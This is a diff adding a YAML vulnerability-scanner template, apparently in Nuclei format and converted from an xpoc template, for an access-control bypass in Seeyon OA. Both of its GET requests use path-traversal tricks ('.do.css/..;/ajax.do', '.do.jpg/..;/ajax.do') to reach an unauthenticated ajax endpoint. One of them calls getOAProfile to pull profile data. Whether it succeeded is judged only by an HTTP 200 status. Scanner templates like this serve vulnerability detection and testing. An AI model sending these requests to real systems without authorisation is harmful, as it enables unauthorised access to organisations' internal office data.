@@ -1,0 +1,25 @@
+id: yaml-poc-seeyon-seeyon_oa-idor-CT-158762
+info:
+  name: Yaml Poc Seeyon Seeyon_Oa Idor Ct 158762
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-seeyon-seeyon_oa-idor-CT-158762'
+  tags: xpoc
+  reference: []
+http:
+- method: GET
+  path:
+  - /seeyon/thirdpartyController.do.css/..;/ajax.do
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
